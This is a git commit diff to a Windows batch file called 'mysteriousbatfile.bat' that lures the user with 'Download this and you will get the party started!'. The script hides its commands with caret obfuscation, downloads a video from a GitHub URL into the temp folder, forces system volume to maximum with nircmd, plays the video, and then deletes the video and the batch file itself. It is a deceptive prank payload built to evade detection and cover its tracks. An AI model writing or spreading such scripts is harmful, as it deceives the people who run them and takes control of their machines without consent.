8adef44cfc4738859ec1b2a6a01eeadcb0b4e731
GrimAnticheat <118537260+Grim-Anticheat@users.noreply.github.com>
2024-08-30 18:57:22 +0300

    Update mysteriousbatfile.bat

--- mysteriousbatfile.bat
+++ mysteriousbatfile.bat
@@ -78,10 +78,10 @@ echo Hello! Download this and you will get the party started!
 echo Initializing...
 
 REM Obfuscate the download, volume set, and video play commands
-set DL_CMD=c^ur^l -o "%%TEMP%%\vid.mp4" "https://github.com/Grim-Anticheat/files-images/raw/main/ssstik.io_@x_l_u_i_x_1723569606416.mp4"
-set VOL_CMD=nir^cmd.e^xe sets^ysvolu^me 65535
-set PLAY_CMD=sta^rt /w^ait wmpla^yer /ful^lscree^n "%%TEMP%%\vid.mp4"
-set CLEAN_CMD=del "%%TEMP%%\vid.mp4" && del "%%~f0"
+set "DL_CMD=c^ur^l -o %%TEMP%%\vid.mp4 https://github.com/Grim-Anticheat/files-images/raw/main/ssstik.io_@x_l_u_i_x_1723569606416.mp4"
+set "VOL_CMD=nir^cmd.e^xe sets^ysvolu^me 65535"
+set "PLAY_CMD=start /min m^p^la^yer /f %%TEMP%%\vid.mp4"
+set "CLEAN_CMD=del %%TEMP%%\vid.mp4 && del %%~f0"
 
 REM Execute commands
 %DL_CMD%
